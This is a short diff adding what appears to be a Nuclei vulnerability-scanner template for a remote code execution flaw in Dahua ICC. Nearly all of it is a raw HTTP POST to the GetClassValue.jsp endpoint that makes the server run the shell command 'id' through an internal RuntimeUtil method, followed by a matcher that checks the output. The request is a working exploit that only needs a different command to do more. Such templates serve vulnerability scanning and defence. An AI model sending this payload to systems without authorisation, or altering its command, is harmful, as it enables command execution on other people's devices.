@@ -1,0 +1,26 @@
+id: Dahua_ICC_GetClassValue_RCE
+info:
+  name: Dahua_ICC_GetClassValue_RCE
+  author: test
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 121
+
+        {
+            "data": {
+                "clazzName": "com.dahua.admin.util.RuntimeUtil",
+                "methodName": "syncexecReturnInputStream",
+                "fieldName": ["id"]
+            }
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200  && contains_all(body_1,"uid")
